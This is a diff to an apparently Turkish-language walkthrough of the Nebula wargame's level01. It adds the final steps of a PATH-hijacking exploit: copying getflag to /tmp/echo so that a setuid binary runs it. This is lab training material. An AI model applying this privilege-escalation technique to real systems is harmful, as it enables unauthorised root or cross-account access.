@@ -89,4 +89,11 @@ PATH değişkenine yeni bir dizin ekliyoruz.
     level01@nebula:/home/flag01$ echo $PATH
     /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
 {% endraw %}
-
+Çalıştırmak istediğimiz dosyayı /tmp altına echo ismiyle kaydediyoruz.
+{% raw %}
+    level01@nebula:/home/flag01$ cp /bin/getflag /tmp/echo
+{% endraw %}
+{% raw %}
+    level01@nebula:/home/flag01$ ./flag01
+    You have successfully executed getflag on a target account
+{% endraw %}
